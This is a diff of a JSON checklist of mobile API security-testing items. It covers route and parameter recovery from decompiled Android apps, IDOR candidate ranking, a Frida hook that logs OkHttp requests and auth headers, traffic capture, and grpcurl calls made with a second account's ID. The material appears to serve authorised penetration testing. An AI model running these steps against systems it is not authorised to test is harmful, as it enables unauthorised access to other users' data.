-   "how": "```bash\n  jadx -d $DEC/jadx --no-debug-info base.apk        # and every split_config.*.apk\n  S=$DEC/jadx/sources\n  grep -rhoE '@(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS|HTTP)\\(\"[^\"]+\"\\)' $S | sort -u > endpoints.txt\n  grep -rhoE '@HTTP\\([^)]*\\)' $S | sort -u                       # @HTTP hides the verb in a named arg\n  grep -rnE '@(GET|POST|PUT|DELETE|PATCH)\\(\"' $S | sed 's#^$DEC/jadx/sources/##' | sort -u > endpoints_with_owner.txt\n  wc -l endpoints.txt\n  # decompiler choked? the same strings live in the DEX string pool:\n  unzip -p base.apk classes*.dex | strings -n 6 | grep -E '^(v[0-9]+|api|1\\.0)/' | sort -u\n```",
-   "proof": "`endpoints.txt` containing concrete route templates\n(`1.0/payment-aggregator/users/bank-details/{userId}`), and at least one of them observed in intercepted\ntraffic returning 200 — the map is only \"proved\" when one route from it appears live.",
+   "test": "**Owner: D01-058** (the P2 route harvest). When P2 already wrote the route map, convert it to the `routes.tsv` contract below instead of re-decompiling; this item is the P6 consumer that defines the contract every authz sweep reads. Recover every server route the app is capable of calling. R8/ProGuard renames classes and methods\nbut **does not rewrite the string values inside runtime-visible annotations** — Retrofit needs those strings\nat runtime to build the request line, so `@GET(\"v2/users/{id}/wallet\")` survives minification verbatim even\nwhen the interface is renamed to `a.b.c`. \"The build is obfuscated\" is never a reason to skip this.",
+   "how": "```bash\n  S=\"$DEC/jadx/sources\"; R=\"$DEC/jadx/resources\"; A=\"$DEC/apktool\"     # set once per shell; every D15 item assumes these\n  [ -d \"$S\" ] || jadx -d \"$DEC/jadx\" --no-debug-info base.apk          # P3 normally did this; and every split_config.*.apk\n  # the normalised route contract every later sweep reads: routes.tsv = METHOD<TAB>PATH (no leading slash), endpoints.txt = its path column\n  grep -rhoE '@(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\\(\"[^\"]+\"\\)' \"$S\" \\\n    | sed -E 's/^@([A-Z]+)\\(\"([^\"]+)\"\\)$/\\1\\t\\2/' | sort -u > routes.tsv\n  grep -rhoE '@HTTP\\([^)]*method *= *\"[A-Z]+\"[^)]*path *= *\"[^\"]+\"' \"$S\" \\\n    | sed -E 's/.*method *= *\"([A-Z]+)\".*path *= *\"([^\"]+)\".*/\\1\\t\\2/' >> routes.tsv   # @HTTP hides the verb in a named arg\n  sed -E 's#\\t/#\\t#' routes.tsv | sort -u > routes.norm && mv routes.norm routes.tsv   # strip the leading slash (BSD/GNU-neutral)\n  cut -f2 routes.tsv | sort -u > endpoints.txt\n  grep -rnE '@(GET|POST|PUT|DELETE|PATCH)\\(\"' \"$S\" | sed \"s#^$S/##\" | sort -u > endpoints_with_owner.txt\n  wc -l routes.tsv endpoints.txt                                        # count your results (D15-032)\n  # decompiler choked? the same strings live in the DEX string pool (quote the member glob: zsh aborts on an unquoted classes*.dex):\n  unzip -p base.apk 'classes*.dex' | strings -n 6 | grep -E '^(v[0-9]+|api|1\\.0)/' | sort -u\n```",
+   "proof": "`routes.tsv` (METHOD, PATH) is the input every later sweep reads (D15-002, D15-023, D15-034,\nD15-061); `endpoints.txt` is its path column, bare paths with no annotation syntax and no leading slash.\nIt contains concrete route templates (`1.0/payment-aggregator/users/bank-details/{userId}`), and at least\none of them is observed in intercepted traffic returning 200 — the map is only \"proved\" when one route\nfrom it appears live.",
    "escalation": "Path-parameter routes feed the BOLA sweep (D15-034); body models feed mass assignment\n(D15-004); hosts feed D18; unproxied hosts feed D15-006.",
-   "ruled_out_when": "Never ruled out — it is an inventory step. But **zero grep hits is a stack signal, not a\nclean result**: run the framework check (D15-007) before writing anything down. An app with no Retrofit hits\nand a `libflutter.so` has an endpoint map, just not here."
+   "ruled_out_when": "Never ruled out — it is an inventory step. But **zero grep hits is a stack signal, not a\nclean result**: run the framework check (D15-007) before writing anything down. An app with no Retrofit hits\nand a `libflutter.so` has an endpoint map, just not here.\nZero hits with live traffic is the D15-091 signal: the client lives in another process or in a generic\nRPC class — run D15-091 and D15-007 before writing n/a."
   },
   {
    "id": "D15-002",
@@ -83,8 +92,10 @@
     "AM-05"
    ],
    "applies_to": "all REST APIs",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "API1:2023 Broken Object Level Authorization",
    "record": "",
    "legacy_meta": {},
@@ -98,14 +109,18 @@
     "vrt": []
    },
    "xrefs": [
+    "D01-058",
+    "D15-001",
     "D15-034",
     "D15-038"
    ],
-   "domain_refs": [],
+   "domain_refs": [
+    "D01"
+   ],
    "has_code": true,
    "skip_when": "",
-   "test": "Of the recovered routes, isolate those whose path embeds a client-supplied object identifier. These\nare exactly the endpoints where the server must perform an ownership check and frequently does not, and\nranking them by data class is what stops you spending the week on the catalogue endpoint.",
-   "how": "```bash\n  grep -rhoE '@(GET|POST|PUT|DELETE|PATCH)\\(\"[^\"]*\\{[^\"]*\\}[^\"]*\"\\)' $S | sort -u > idor_candidates.txt\n  grep -iE 'bank|card|payment|wallet|refund|order|address|invoice|kyc|document|profile|user|account|ticket|booking|claim|message' idor_candidates.txt\n```\nFor each, open the enclosing interface method and record whether an auth header is attached per-method\n(`@Header(\"Authorization\")`) or globally by an interceptor.",
+   "test": "**Owner: D01-058** (the ID-shape shortlist, P2); re-derived here only to bind it to `routes.tsv`. Of the recovered routes, isolate those whose path embeds a client-supplied object identifier. These\nare exactly the endpoints where the server must perform an ownership check and frequently does not, and\nranking them by data class is what stops you spending the week on the catalogue endpoint.",
+   "how": "```bash\n  awk -F'\\t' '$2 ~ /\\{[^}]+\\}/' routes.tsv > idor_candidates.tsv         # METHOD<TAB>PATH rows with a path parameter (D15-001 contract)\n  grep -iE 'bank|card|payment|wallet|refund|order|address|invoice|kyc|document|profile|user|account|ticket|booking|claim|message' idor_candidates.tsv\n  wc -l idor_candidates.tsv\n```\nFor each, open the enclosing interface method and record whether an auth header is attached per-method\n(`@Header(\"Authorization\")`) or globally by an interceptor.",
    "proof": "A table of `METHOD · PATH · ID-PARAM · OWNER-OF-ID · AUTH-SOURCE · DATA-CLASS`. Proof of\ncandidacy is the annotation text plus the interface signature; exploitability comes at D15-034.",
    "escalation": "Straight into the two-account replay, and if IDs are sequential (D15-038) into the\nmass-extraction impact statement that moves P3 to P1.",
    "ruled_out_when": "The API is genuinely identifier-free — every route is `/me`-scoped with the subject taken\nfrom the token and no route template contains a `{}` segment, in body, query, header or multipart. State that\nyou checked all four positions, because an id in a header (`X-User-Id`) is the same bug with no path\nparameter."
@@ -113,11 +128,11 @@
   {
    "id": "D15-003",
    "domain": "D15",
-   "title": "Recover hidden request parameters from Retrofit parameter annotations",
+   "title": "Load the hidden request parameters recovered from Retrofit parameter annotations into the authz sweep",
    "severity": "medium",
    "severity_floor": "medium",
    "severity_note": "Medium",
-   "vrt": "`broken_access_control.privilege_escalation` (VARIES) when a recovered parameter changes an authorisation outcome",
+   "vrt": "`broken_access_control.privilege_escalation` (varies) when a recovered parameter changes an authorisation outcome",
    "vrt_priority": "varies",
    "vrt_best": "varies",
    "attacker": "AM-05",
@@ -125,8 +140,10 @@
     "AM-05"
    ],
    "applies_to": "all Retrofit apps; the same idea applies to Volley/Ktor builders, where keys appear as plain string literals",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "API3:2023 Broken Object Property Level Authorization",
    "record": "",
    "legacy_meta": {},
@@ -142,18 +159,23 @@
     ]
    },
    "xrefs": [
+    "D01-059",
+    "D15-007",
     "D15-024",
     "D15-061",
-    "D15-064"
+    "D15-064",
+    "D15-091"
    ],
-   "domain_refs": [],
+   "domain_refs": [
+    "D01"
+   ],
    "has_code": true,
    "skip_when": "",
-   "test": "Enumerate every field name the client is *capable* of sending. `@Query`, `@QueryMap`, `@Field`,\n`@FieldMap`, `@Part`, `@Header`, `@Path` annotation values also survive R8, and routinely include parameters\nthe UI never exercises: debug flags, `includeDeleted`, `asUser`, `channel`, `storeId`, `role`.",
+   "test": "**Owner: D01-059** (P2); load its output when P2 ran — this is the P6 consumer. Enumerate every field name the client is *capable* of sending. `@Query`, `@QueryMap`, `@Field`,\n`@FieldMap`, `@Part`, `@Header`, `@Path` annotation values also survive R8, and routinely include parameters\nthe UI never exercises: debug flags, `includeDeleted`, `asUser`, `channel`, `storeId`, `role`.",
    "how": "```bash\n  grep -rhoE '@(Query|Field|Part|Header|Path)\\(\"[^\"]+\"\\)' $S | sed 's/.*(\"\\(.*\\)\")/\\1/' | sort -u > client_params.txt\n  grep -rn '@QueryMap\\|@FieldMap\\|@PartMap\\|@HeaderMap' $S\n  grep -iE 'admin|internal|debug|as_?user|impersonat|role|scope|all|include|expand|fields|force|skip|override' client_params.txt\n```\nAny `@QueryMap Map<String,String>` is an **arbitrary-parameter channel**: the handler accepts whatever the\napp puts in it, so parameter mining against that endpoint is justified rather than speculative.",
    "proof": "`client_params.txt`, plus for each interesting name an intercepted request where the parameter is\n*absent* (establishing it is reachable but unused), then the same request with it added returning a different\nstatus, length or field set.",
    "escalation": "Directly into mass assignment (D15-064) and BFLA (D15-061) — an `asUser=`/`role=`/`storeId=`\nparameter the server honours is horizontal or vertical escalation in one request.",
-   "ruled_out_when": "Every recovered parameter is present in normal traffic and adding the security-relevant\nones produces a byte-identical normalised response (D15-024) on an endpoint with a working positive control.\n\"The parameter was ignored\" needs the normalised diff, not a glance."
+   "ruled_out_when": "Every recovered parameter is present in normal traffic and adding the security-relevant\nones produces a byte-identical normalised response (D15-024) on an endpoint with a working positive control.\n\"The parameter was ignored\" needs the normalised diff, not a glance.\nZero hits with live traffic is the D15-091 signal: the client lives in another process or in a generic\nRPC class — run D15-091 and D15-007 before writing n/a."
   },
   {
    "id": "D15-004",
@@ -170,8 +192,10 @@
     "AM-05"
    ],
    "applies_to": "all JSON APIs; the `@SerializedName` oracle is Android-specific and high-yield",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "API3:2023 (mass assignment sub-case)",
    "record": "",
    "legacy_meta": {},
@@ -185,9 +209,11 @@
     "vrt": []
    },
    "xrefs": [
+    "D15-007",
     "D15-042",
     "D15-065",
-    "D15-082"
+    "D15-082",
+    "D15-091"
    ],
    "domain_refs": [],
    "has_code": true,
@@ -196,7 +222,7 @@
    "how": "```bash\n  grep -rln 'RequestBody\\|@SerializedName\\|@Json(name\\|@JsonProperty' $S | head -40\n  grep -rhoE '@SerializedName\\(\"[^\"]+\"\\)' $S | sed 's/.*(\"\\(.*\\)\")/\\1/' | sort -u > body_fields.txt\n  grep -rhoE '@Json\\(name *= *\"[^\"]+\"' $S | sed 's/.*\"\\(.*\\)\"/\\1/' | sort -u >> body_fields.txt\n  sort -u body_fields.txt | grep -iE 'amount|price|total|discount|credit|coupon|status|state|role|isadmin|verified|owner|user_?id|merchant|sender|fee|tax|currency|qty|quantity|tier|balance|limit|kyc'\n```\nWorked shape from the corpus: `OrderRequestBody` sends `finalCustomerAmount`, `senderId`, `addressId`,\n`creditsToDeduct` — four separate trust questions in one body.",
    "proof": "A per-model table of `FIELD · TYPE · SECURITY MEANING · SERVER RECOMPUTES? (untested/yes/no)`.",
    "escalation": "Each \"no\" is a D15-065 or D15-082 finding; a field naming the *owner* (`userId`, `senderId`,\n`merchantId`) turns mass assignment into cross-account object creation (D15-042).",
-   "ruled_out_when": "Every security-relevant field in the DTOs is demonstrated to be recomputed server-side —\nsend the tampered value, read the object back with a separate GET, and show the server's number, not yours."
+   "ruled_out_when": "Every security-relevant field in the DTOs is demonstrated to be recomputed server-side —\nsend the tampered value, read the object back with a separate GET, and show the server's number, not yours.\nZero hits with live traffic is the D15-091 signal: the client lives in another process or in a generic\nRPC class — run D15-091 and D15-007 before writing n/a."
   },
   {
    "id": "D15-005",
@@ -217,12 +243,13 @@
    "requires_tags": [
     "backend-api"
    ],
-   "maps_to": "MASVS-AUTH-1; MASTG-TEST-0217 covers the same OkHttp/Retrofit configuration surface",
+   "maps_to": "MASVS-AUTH-1; MASTG-TECH-0022 (Information Gathering - Network Communication); MASTG-TECH-0011 (interception proxy)",
    "record": "",
    "legacy_meta": {},
    "ids": {
     "mastg": [
-     "MASTG-TEST-0217"
+     "MASTG-TECH-0011",
+     "MASTG-TECH-0022"
     ],
     "maswe": [],
     "masvs": [
@@ -234,7 +261,9 @@
     "vrt": []
    },
    "xrefs": [
-    "D15-084"
+    "D15-007",
+    "D15-084",
+    "D15-091"
    ],
    "domain_refs": [
     "D12"
@@ -245,7 +274,7 @@
    "how": "```bash\n  grep -rn 'implements Interceptor\\|: Interceptor\\|Interceptor {' $S\n  grep -rn 'addInterceptor\\|addNetworkInterceptor\\|authenticator(' $S\n  grep -rn 'newBuilder().header(\\|addHeader(' $S | grep -iE 'authorization|bearer|x-|token|sign|hmac|nonce|timestamp|device'\n```\nRead each `intercept(Chain)` body: it gives you the full header set (`Authorization`, `X-Device-Id`,\n`X-App-Version`, `X-Signature`) and whether a request signature is computed (HMAC over method+path+body+ts).\n`okhttp3.Authenticator` is the 401-refresh hook and tells you the refresh endpoint for free.",
    "proof": "A reconstructed `curl` the server answers with 200, built entirely from interceptor logic. A 401\nmeans you have missed a header — the interceptor names which.",
    "escalation": "If the signature is computed client-side from a hardcoded key (D12), you can sign arbitrary\nrequests and the \"device binding\" is cosmetic → D15-084.",
-   "ruled_out_when": "n/a — this is an inventory step. It is \"complete\" when a minimal reconstructed request\nreturns the same body the app's own request returned."
+   "ruled_out_when": "n/a — this is an inventory step. It is \"complete\" when a minimal reconstructed request\nreturns the same body the app's own request returned.\nZero hits with live traffic is the D15-091 signal: the client lives in another process or in a generic\nRPC class — run D15-091 and D15-007 before writing n/a."
   },
   {
    "id": "D15-006",
@@ -269,13 +298,14 @@
     "frida",
     "mitm"
    ],
-   "maps_to": "MASTG-TEST-0238 (Runtime Use of Network APIs — placeholder test in MASTG beta; this is the technique it describes); MASTG-TEST-0236's stated proxy-vs-capture limitation",
+   "maps_to": "MASTG-TECH-0010 (Basic Network Monitoring/Sniffing), MASTG-TECH-0043 (Method Hooking), MASTG-TECH-0011 (interception proxy, for the proxy-unaware-client caveat)",
    "record": "",
    "legacy_meta": {},
    "ids": {
     "mastg": [
-     "MASTG-TEST-0236",
-     "MASTG-TEST-0238"
+     "MASTG-TECH-0010",
+     "MASTG-TECH-0011",
+     "MASTG-TECH-0043"
     ],
     "maswe": [],
     "masvs": [],
@@ -284,15 +314,18 @@
     "attack": [],
     "vrt": []
    },
-   "xrefs": [],
+   "xrefs": [
+    "D15-007",
+    "D15-091"
+   ],
    "domain_refs": [],
    "has_code": true,
    "skip_when": "",
    "test": "Capture full request/response pairs from inside the process. This is immune to pinning, to\nproxy-unaware clients and to `OkHttpClient`s built with `Proxy.NO_PROXY`. Use it to *complete* the endpoint\nmap, not to replace the proxy.",
-   "how": "```javascript\n  // frida -D \"$SERIAL\" -p <pid> -l okhttp_tap.js\n  Java.perform(function () {\n    var Buffer = Java.use(\"com.android.okhttp.okio.Buffer\");\n    var Interceptor = Java.use(\"okhttp3.Interceptor\");\n    var Tap = Java.registerClass({\n      name: \"okhttp3.TapInterceptor\", implements: [Interceptor],\n      methods: { intercept: function (chain) {\n          var req = chain.request();\n          console.log(\"[REQ] \" + req.method() + \" \" + req.url() + \"\\n\" + req.headers());\n          var body = req.body();\n          if (body && body.contentLength() > 0) { var b = Buffer.$new(); body.writeTo(b); console.log(b.readString()); }\n          var res = chain.proceed(req);\n          console.log(\"[RES] \" + res.code() + \"\\n\" + res.headers());\n          return res;\n      }}});\n    var B = Java.use(\"okhttp3.OkHttpClient$Builder\");\n    var tap = Tap.$new();\n    B.build.implementation = function () { this.interceptors().add(tap); return this.build(); };\n  });\n```\nCross-check with a packet capture so you can name what is still missing:\n```bash\nemulator -avd pt -writable-system -tcpdump cap.pcap -http-proxy 127.0.0.1:8080 &\ntshark -r cap.pcap -Y 'tcp.flags.syn==1 && tcp.flags.ack==0' -T fields -e ip.dst -e tcp.dstport | sort -u\ntshark -r cap.pcap -Y 'udp.dstport==443' -T fields -e ip.dst | sort -u     # QUIC / HTTP-3\n```",
-   "proof": "Request lines and bodies printed for hosts that never appeared in the proxy log — that delta is\nboth a testability finding (\"traffic bypasses the system proxy\") and the missing half of your inventory.",
+   "how": "```javascript\n  // frida -D \"$SERIAL\" -f \"$PKG\" -l okhttp_tap.js   # spawn, so Builder.build is seen; frida-tools 17 resumes automatically\n  Java.perform(function () {\n    var Buffer = Java.use(\"okio.Buffer\");   // minified builds relocate okio too: Java.enumerateLoadedClasses, filter /okio\\.Buffer$/ first\n    var Interceptor = Java.use(\"okhttp3.Interceptor\");\n    var Tap = Java.registerClass({\n      name: \"okhttp3.TapInterceptor\", implements: [Interceptor],\n      methods: { intercept: function (chain) {\n          var req = chain.request();\n          console.log(\"[REQ] \" + req.method() + \" \" + req.url() + \"\\n\" + req.headers());\n          var body = req.body();\n          if (body && body.contentLength() !== 0) { var b = Buffer.$new(); body.writeTo(b); console.log(b.readUtf8()); }\n          var res = chain.proceed(req);\n          console.log(\"[RES] \" + res.code() + \"\\n\" + res.headers());\n          return res;\n      }}});\n    var B = Java.use(\"okhttp3.OkHttpClient$Builder\");\n    var tap = Tap.$new();\n    B.build.implementation = function () { this.interceptors().add(tap); return this.build(); };\n    // late-attach fallback (-p <pid>): clients built before the hook are only visible at newCall\n    var Cl = Java.use(\"okhttp3.OkHttpClient\");\n    Cl.newCall.overload(\"okhttp3.Request\").implementation = function (r) { console.log(\"[CALL] \" + r.method() + \" \" + r.url()); return this.newCall(r); };\n  });\n```\nCross-check with a packet capture so you can name what is still missing. One flow file and one pcap **per\nrun** (`-w +file` appends; a bare `-w` truncates on every restart and a flow file reused across modes is\noverwritten — the delta is then computed against the wrong capture):\n```bash\nRUN=$(date +%Y%m%dT%H%M%S); mkdir -p flows\nmitmdump -p 8080 -w \"+flows/D15-006-$RUN.mitm\" &                     # '+' appends; never one shared file\nemulator -avd \"$AVD\" -writable-system -tcpdump \"flows/D15-006-$RUN.pcap\" -http-proxy 127.0.0.1:8080 &\ntshark -r \"flows/D15-006-$RUN.pcap\" -Y 'tcp.flags.syn==1 && tcp.flags.ack==0' -T fields -e ip.dst -e tcp.dstport | sort -u\ntshark -r \"flows/D15-006-$RUN.pcap\" -Y 'udp.dstport==443' -T fields -e ip.dst | sort -u     # QUIC / HTTP-3\n```\nThe same per-sweep rule applies to every later item: `mitmdump -w +flows/<item>-<ts>.mitm` with the\nsweep's start/end timestamps in the notes, so a client-side negative can be re-read if backend scope\narrives later (Triage order step 0).",
+   "proof": "Request lines and bodies printed for hosts that never appeared in the proxy log — that delta is\nboth a testability finding (\"traffic bypasses the system proxy\") and the missing half of your inventory.\nName the flow file and pcap the delta was computed from.",
    "escalation": "Any endpoint visible only here is by definition untested by anyone who relied on a proxy.",
-   "ruled_out_when": "The tap's host set and the pcap's destination set are both subsets of the proxy's host\nset, after exercising the app's full UI including background sync. Note the class is `okhttp3.*` when shaded\nnormally; minified builds relocate it — resolve with `Java.enumerateLoadedClasses` filtering on `Interceptor`\nbefore concluding \"no OkHttp\"."
+   "ruled_out_when": "The tap's host set and the pcap's destination set are both subsets of the proxy's host\nset, after exercising the app's full UI including background sync. Note the class is `okhttp3.*` when shaded\nnormally; minified builds relocate it — resolve with `Java.enumerateLoadedClasses` filtering on `Interceptor`\nbefore concluding \"no OkHttp\".\nA tap attached with `-p` after start proves nothing about clients built earlier — use spawn (`-f`) or the\n`newCall` hook before concluding. Zero hits with live traffic is the D15-091 signal: the client lives in\nanother process or in a generic RPC class — run D15-091 and D15-007 before writing n/a."
   },
   {
    "id": "D15-007",
@@ -308,24 +341,17 @@
    "attacker_ids": [
     "AM-12"
    ],
-   "applies_to": "React Native (Hermes/JSC), Flutter, Cordova, Unity, Xamarin/KMP",
-   "requires": "backend-api, flutter, react-native, hermes, cordova, unity, xamarin, kmp",
+   "applies_to": "React Native (Hermes/JSC), Flutter, Cordova, Unity, Xamarin/KMP, **and Java/Kotlin apps whose HTTP stack is a single generic RPC call site** (protobuf-over-HTTP, Cronet, a custom OkHttp wrapper) rather than annotated interfaces — the framework tags below name the bundle case; the RPC branch applies to any stack",
+   "requires": "backend-api",
    "requires_tags": [
-    "backend-api",
-    "flutter",
-    "react-native",
-    "hermes",
-    "cordova",
-    "unity",
-    "xamarin",
-    "kmp"
+    "backend-api"
    ],
-   "maps_to": "MASTG-TEST-0237 (Cross-Platform Framework Configurations — `status: placeholder`; the guide explicitly acknowledges cross-platform HTTP stacks are not yet covered); MASTG-TOOL-0125",
+   "maps_to": "MASTG-TECH-0022 (Information Gathering - Network Communication); MASTG-TOOL-0125 (apkleaks); MASTG has no endpoint-recovery test for cross-platform stacks — the technique lives here",
    "record": "",
    "legacy_meta": {},
    "ids": {
     "mastg": [
-     "MASTG-TEST-0237",
+     "MASTG-TECH-0022",
      "MASTG-TOOL-0125"
     ],
     "maswe": [],
@@ -335,13 +361,18 @@
     "attack": [],
     "vrt": []
    },
-   "xrefs": [],
-   "domain_refs": [],
+   "xrefs": [
+    "D15-010",
+    "D15-091"
+   ],
+   "domain_refs": [
+    "D19"
+   ],
    "has_code": true,
    "skip_when": "",
    "test": "On cross-platform stacks zero Retrofit hits is *expected*, and the endpoint map lives in the\nbundle/snapshot. Getting this wrong produces an \"app has no API\" conclusion that is simply false and silently\nzeroes the entire chapter. The bundle also contains admin/debug/feature-flagged routes no amount of clicking\nreveals.",
-   "how": "```bash\n  unzip -l base.apk | grep -E 'libhermes|libjsc|index.android.bundle|libflutter|libapp.so|cordova|assets/www'\n  # Flutter\n  unzip -p base.apk lib/arm64-v8a/libapp.so > libapp.so\n  strings -n 6 libapp.so | grep -E '^/?(api|v[0-9])/|https?://' | sort -u\n  # React Native, plain JS bundle\n  unzip -p base.apk assets/index.android.bundle | grep -aoE 'https?://[^\"'\"'\"']+' | sort -u\n  # Hermes bytecode (magic c61fbc03c103191f): strings(1) under-reports badly; parse the string table\n  hermes-decomp decompile ext/assets/index.android.bundle -o out/ --deep\n  grep -aoE '[\"'\\''`]/(api|v[0-9]+|graphql|internal|admin)[A-Za-z0-9._/{}$-]*' hbc.strings | sort -u\n  # Unity / Xamarin\n  strings -a out/dump.cs out/assemblies/out/*.dll | grep -aoE 'https?://[^ \"]+' | sort -u\n```",
-   "proof": "A route list extracted from the bundle that matches routes observed in the proxy, plus routes that\ndo not appear in the proxy at all. For OTA-updating apps, compare the **on-device** bundle's Hermes\n`sourceHash` against the APK's — if they differ, the APK's routes are not the live routes.",
+   "how": "```bash\n  unzip -l base.apk | grep -E 'libhermes|libjsc|index.android.bundle|libflutter|libapp.so|cordova|assets/www'\n  # Flutter\n  unzip -p base.apk lib/arm64-v8a/libapp.so > libapp.so\n  strings -n 6 libapp.so | grep -E '^/?(api|v[0-9])/|https?://' | sort -u\n  # React Native, plain JS bundle\n  unzip -p base.apk assets/index.android.bundle | grep -aoE 'https?://[^\"'\"'\"']+' | sort -u\n  # Hermes bytecode (magic c61fbc03): strings(1) under-reports badly; parse the string table\n  unzip -p base.apk assets/index.android.bundle > index.android.bundle\n  head -c4 index.android.bundle | xxd -p                               # c61fbc03 = Hermes bytecode\n  pip install hermes-dec                                               # hbc-file-parser / hbc-disassembler / hbc-decompiler\n  hbc-disassembler index.android.bundle out.hasm                       # the string table is emitted in the disassembly\n  grep -aoE '[\"'\\''`]/(api|v[0-9]+|graphql|internal|admin)[A-Za-z0-9._/{}$-]*' out.hasm | tr -d '\"'\\''`' | sort -u > routes_rn.txt\n  # Unity / Xamarin (Il2CppDumper output and the extracted assemblies; see D19)\n  strings -a dump.cs assemblies/*.dll 2>/dev/null | grep -aoE 'https?://[^ \"]+' | sort -u\n  # protobuf-over-HTTP RPC (Java/Kotlin): the route is a short path literal passed to ONE generic call site\n  grep -rhoE '\"/[a-z0-9_]{1,3}/[A-Za-z0-9_./-]{3,}\"' \"$S\" | sort | uniq -c | sort -rn | head -40        # /g/..., /t/... style\n  grep -rnE 'com\\.google\\.protobuf\\.(GeneratedMessageLite|MessageLite)|\\.parseFrom\\(|newBuilder\\(\\)' \"$S\" | cut -d: -f1 | sort | uniq -c | sort -rn | head\n  grep -rnE 'CronetEngine|UrlRequest\\.Builder|org\\.chromium\\.net' \"$S\" | head                           # transport\n  # the generic call site: a method taking (String path, <proto> req, <proto parser>) — list every caller with its path literal\n  grep -rnE '\\(\"/[a-z0-9_]{1,3}/[A-Za-z0-9_./-]+\", ' \"$S\" | sed -E 's/.*\\(\"(\\/[^\"]+)\".*/\\1/' | sort -u > routes_rpc.txt\n  wc -l routes_rn.txt routes_rpc.txt\n```",
+   "proof": "A route list extracted from the bundle that matches routes observed in the proxy, plus routes that\ndo not appear in the proxy at all. For the RPC branch: `routes_rpc.txt` with one route observed live\n(User-Agent/host matched to the app's own process per D15-091); the bodies are protobuf — hand them to\nD15-010. For OTA-updating apps, compare the **on-device** bundle's Hermes\n`sourceHash` against the APK's — if they differ, the APK's routes are not the live routes.",
    "escalation": "Bundle strings also yield storage keys, feature-flag names and error strings that let you\npredict server behaviour before you send anything.",
    "ruled_out_when": "You have identified the framework positively (a named `.so`/bundle asset) and extracted\nits route set. A table adjacency in a Hermes string table is a hint, never proof of a call site — confirm\nlive before listing a route as reachable. **LEGACY:** pre-Hermes RN ships plain JS and is trivially\ngreppable; Hermes became the RN default from 0.70."
   },
@@ -386,7 +417,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "If the backend is GraphQL the client ships the operation documents (Apollo codegen) or only their\nSHA-256 hashes (Automatic Persisted Queries). Both give you the operation inventory without introspection —\nincluding admin/internal mutations the mobile UI never calls but the endpoint still serves.",
-   "how": "```bash\n  unzip -l base.apk | grep -iE '\\.graphql|\\.gql|graphql'\n  grep -rn 'operationName\\|__typename\\|mutation \\|query \\|subscription ' $S | head -50\n  grep -rnE '\"[0-9a-f]{64}\"' $S | grep -i 'persist\\|hash\\|apq\\|query' | head      # APQ sha256Hash values\n  grep -rn 'OPERATION_DOCUMENT\\|QUERY_DOCUMENT\\|com/apollographql' $S $DEC/jadx/resources 2>/dev/null | head\n```",
+   "how": "```bash\n  unzip -l base.apk | grep -iE '\\.graphql|\\.gql|graphql'\n  grep -rn 'operationName\\|__typename\\|mutation \\|query \\|subscription ' $S | head -50\n  grep -rnE '\"[0-9a-f]{64}\"' $S | grep -i 'persist\\|hash\\|apq\\|query' | head      # APQ sha256Hash values\n  grep -rn 'OPERATION_DOCUMENT\\|QUERY_DOCUMENT\\|com/apollographql' \"$S\" \"$R\" 2>/dev/null | head\n```",
    "proof": "The recovered document text, then that exact operation replayed against `/graphql` returning\n`data` rather than `PersistedQueryNotFound`.",
    "escalation": "Operation names reveal `grantAdminAccess`-shaped mutations → D15-075/D15-079/D15-080.",
    "ruled_out_when": "No GraphQL transport is present (no `/graphql` route, no Apollo classes, no\n`__typename` strings) — and you confirmed that by probing the common paths in D15-072, not by the absence of\nthe word \"graphql\" in the manifest."
@@ -426,14 +457,17 @@
     ]
    },
    "xrefs": [
+    "D01-066",
     "D15-034",
     "D15-061"
    ],
-   "domain_refs": [],
+   "domain_refs": [
+    "D01"
+   ],
    "has_code": true,
    "skip_when": "",
-   "test": "gRPC traffic is invisible to a naive HTTP proxy and is often the *entire* API for newer apps.\nRecover fully-qualified service/method names and message shapes from the binary, then call the service\ndirectly — the mobile client is not the only client the server will answer.",
-   "how": "```bash\n  # \"/package.Service/Method\" survives as a string\n  unzip -p base.apk classes*.dex | strings -n 8 | grep -E '^/[a-zA-Z0-9_.]+/[A-Za-z0-9_]+$' | sort -u\n  grep -rn 'MethodDescriptor\\|generateFullMethodName\\|io.grpc' $S | head -30\n  unzip -l base.apk | grep -iE '\\.proto|\\.protoset|descriptor'\n  grpcurl <host>:443 list\n  grpcurl <host>:443 list package.Service\n  grpcurl <host>:443 describe package.Service.Method\n  grpcurl -H \"authorization: Bearer $TOKEN\" -d '{\"id\":\"'\"$ID_B\"'\"}' <host>:443 package.Service/GetProfile\n  # reflection disabled? use the recovered descriptors\n  grpcurl -protoset my-protos.bin list\n  grpcurl -import-path ./protos -proto api.proto describe package.Service.Method\n```",
+   "test": "**Owner: D01-066** (P2 gRPC recovery); load its output when P2 ran — this is the P6 consumer. gRPC traffic is invisible to a naive HTTP proxy and is often the *entire* API for newer apps.\nRecover fully-qualified service/method names and message shapes from the binary, then call the service\ndirectly — the mobile client is not the only client the server will answer.",
+   "how": "```bash\n  # \"/package.Service/Method\" survives as a string\n  unzip -p base.apk 'classes*.dex' | strings -n 8 | grep -E '^/[a-zA-Z0-9_.]+/[A-Za-z0-9_]+$' | sort -u\n  grep -rn 'MethodDescriptor\\|generateFullMethodName\\|io.grpc' $S | head -30\n  unzip -l base.apk | grep -iE '\\.proto|\\.protoset|descriptor'\n  grpcurl <host>:443 list\n  grpcurl <host>:443 list package.Service\n  grpcurl <host>:443 describe package.Service.Method\n  grpcurl -H \"authorization: Bearer $TOKEN\" -d '{\"id\":\"'\"$ID_B\"'\"}' <host>:443 package.Service/GetProfile\n  # reflection disabled? use the recovered descriptors\n  grpcurl -protoset my-protos.bin list\n  grpcurl -import-path ./protos -proto api.proto describe package.Service.Method\n```",
    "proof": "`grpcurl list` returning a service list is proof that **server reflection is enabled in\nproduction** (the gRPC analogue of GraphQL introspection, Low/Medium on its own). A successful invocation\ncarrying your bearer token proves the endpoint is reachable outside the app.",
    "escalation": "Enumerate every method the app never calls and run D15-034/D15-061 against each.",
